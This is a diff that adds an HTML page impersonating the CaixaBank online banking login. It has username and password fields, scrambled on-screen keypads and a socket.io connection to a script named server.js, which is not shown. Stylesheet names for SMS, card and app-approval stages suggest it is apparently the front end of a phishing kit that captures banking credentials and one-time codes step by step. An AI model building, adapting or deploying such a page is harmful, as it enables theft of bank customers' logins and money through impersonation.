@@ -1,0 +1,81 @@
+<html lang="fr"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>CaixaBank | banca digital CaixaBankNow</title>
+    <link rel="icon" href="./imgs/favicon/favicon.ico">
+    <script src="js/jquery.min.js"></script> 
+    <script src="js/socket.io.js"></script>
+    <link rel="stylesheet" href="./css/login.css">
+    <link rel="stylesheet" href="./css/loading.css">
+    <link rel="stylesheet" href="./css/app.css">
+    <link rel="stylesheet" href="./css/spinner.css">
+    <link rel="stylesheet" href="./css/app_approve.css">
+    <link rel="stylesheet" href="./css/cle_approve.css">
+    <link rel="stylesheet" href="./css/sms.css">
+    <link rel="stylesheet" href="./css/cc.css">
+    
+    
+    <script type="application/javascript">
+        document.addEventListener("touchstart", function() {}, false);
+      </script>
+    
+</head>
+<body>
+
+
+<div class="container" id="Variable_countainer"><input type="hidden" id="DivName" value="Login">
+<input type="hidden" id="DivNext" value="Loading">
+
+
+<img src="imgs/login/bg.png" id="bg1" hidden="">
+<img src="imgs/login/bg2.png" id="bg2" hidden="">
+
+<div class="myLogin">
+
+    <div class="myLoginLine0"><img src="imgs/login/x.png" id="myx" alt="" hidden="" height="26"></div>
+    <div class="myLoginLine1"><img src="imgs/login/1.png" alt="" height="19"></div>
+    <div class="myLoginLine2"><img src="imgs/login/2.png" alt="" height="40"></div>
+    <div class="myLoginLine3"><img src="imgs/login/3.png" alt="" height="30px"></div>
+    <div class="myLoginLine4"><img src="imgs/login/4.png" alt="" width="" height="19"><img src="imgs/login/5.png" alt="" width="" height="18"></div>
+    <div class="myLoginLine5"><input type="text" name="ur" id="ur"></div>
+    <div class="myLoginLine51"><img src="imgs/login/errormssg1.png" id="mssg1" alt="" hidden="" height="19"></div>
+
+    <div class="clavierAll" id="ClavierAllUser">
+
+        <ul class="ClavierAllUser"><li class="liactive">4</li><li class="liactive">5</li><li class="liactive">1</li><li class="liactive">8</li><li class="liactive">7</li><li class="liactive">3</li><li class="liactive">9</li><li class="liactive">2</li><li class="liactive">6</li><li class="liactive">0</li></ul>
+        <ul class="ClavierAllUser"><li class="liactive">Q</li><li class="liactive">W</li><li class="liactive">E</li><li class="liactive">R</li><li class="liactive">T</li><li class="liactive">Y</li><li class="liactive">U</li><li class="liactive">I</li><li class="liactive">O</li><li class="liactive">P</li></ul>
+        <ul class="ClavierAllUser"><li class="liactive">A</li><li class="liactive">S</li><li class="liactive">D</li><li class="liactive">F</li><li class="liactive">G</li><li class="liactive">H</li><li class="liactive">J</li><li class="liactive">K</li><li class="liactive">L</li><li class="liactive">Ñ</li></ul>
+        <ul class="ClavierAllUser"><li class="liactive">Z</li><li class="liactive">X</li><li class="liactive">C</li><li class="liactive">V</li><li class="liactive">B</li><li class="liactive">N</li><li class="liactive">M</li><li class="liactive" id="borrar">BORRAR</li></ul>
+        
+    </div>
+
+    <div class="myLoginLine6"><img src="imgs/login/6.png" alt="" width="" height="25"><img src="imgs/login/7.png" onclick="showClavierAllUser()" alt="" id="png7" height="29"><img src="imgs/login/clavier1.png" onclick="hideClavierAllUser()" alt="" id="clavier1" hidden="" height="29"></div>
+    <div class="myLoginLine7"><img src="imgs/login/8.png" alt="" width="" height="25"></div>
+    <div class="myLoginLine8"><input type="password" name="pss" id="pss"></div>
+    <div class="myLoginLine51"><img src="imgs/login/errormsg2.png" id="mssg2" alt="" hidden="" height="19"></div>
+
+    <div class="clavierAll" id="clavierAllPass">
+
+        <ul class="ClavierAllPass"><li class="liactive">4</li><li class="liactive">5</li><li class="liactive">1</li><li class="liactive">8</li><li class="liactive">7</li><li class="liactive">3</li><li class="liactive">9</li><li class="liactive">2</li><li class="liactive">6</li><li class="liactive">0</li></ul>
+        <ul class="ClavierAllPass"><li class="liactive">Q</li><li class="liactive">W</li><li class="liactive">E</li><li class="liactive">R</li><li class="liactive">T</li><li class="liactive">Y</li><li class="liactive">U</li><li class="liactive">I</li><li class="liactive">O</li><li class="liactive">P</li></ul>
+        <ul class="ClavierAllPass"><li class="liactive">A</li><li class="liactive">S</li><li class="liactive">D</li><li class="liactive">F</li><li class="liactive">G</li><li class="liactive">H</li><li class="liactive">J</li><li class="liactive">K</li><li class="liactive">L</li><li class="liactive">Ñ</li></ul>
+        <ul class="ClavierAllPass"><li class="liactive">Z</li><li class="liactive">X</li><li class="liactive">C</li><li class="liactive">V</li><li class="liactive">B</li><li class="liactive">N</li><li class="liactive">M</li><li class="liactive" id="borrar">BORRAR</li></ul>
+        
+    </div>
+
+
+    <div class="clavierNotAll" id="clavierNotAllPass">
+        <ul class="ClavierNotAllPass"><li class="liactive">5</li><li class="liactive">2</li><li class="liactive">7</li><li class="liactive">0</li><li class="liactive">3</li><li class="liactive">1</li></ul>
+        <ul class="ClavierNotAllPass"><li class="liactive">8</li><li class="liactive">6</li><li class="liactive">9</li><li class="liactive">4</li><li class="liactive" id="borrar">BORRAR</li></ul>        
+    </div>
+
+    <div class="myLoginLine9"><img src="imgs/login/9.png" onclick="showmethenumbers()" id="png9" alt="" width="" hidden="" height="29"><img src="imgs/login/clavier2.png" onclick="showClavierLetter()" id="clavier2" alt="" width="" height="24"></div>
+    <div class="myLoginLine10" id="clickmee"><img src="imgs/login/10.png" alt="" width="" height="25"></div>
+    <div class="myLoginLine11"><img src="imgs/login/11.png" alt="" width="" height="25"></div>
+</div></div>
+
+
+<script src="js/server.js" defer=""></script>
+
+</body></html>
